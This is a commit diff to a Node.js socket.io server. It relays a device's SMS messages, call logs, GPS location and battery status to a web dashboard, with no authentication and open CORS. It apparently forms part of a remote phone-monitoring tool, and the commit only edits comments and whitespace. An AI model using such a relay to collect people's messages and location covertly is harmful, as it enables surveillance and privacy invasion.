add8fb145b1bdea281204b705a4e81505f799b47
sekharathome <58811293+sekharathome@users.noreply.github.com>
2026-01-18 12:39:13 +0530

    Update server.js

--- server.js
+++ server.js
@@ -10,21 +10,20 @@ const io = new Server(server, { cors: { origin: "*" } });
 app.use(express.static(path.join(__dirname, 'public')));
 
 io.on('connection', (socket) => {
-    // Relay Battery
-    socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
-    
-    // Relay SMS
+   socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
     socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
     socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
-
-    // Relay Call Logs
+    
+    // NEW: Call Logs
     socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
     socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));
 
-    // Relay GPS
+    // NEW: GPS
     socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));
 
     socket.on('disconnect', () => socket.broadcast.emit('device-status', { online: false }));
+
 });
 
 server.listen(process.env.PORT || 3000);
+
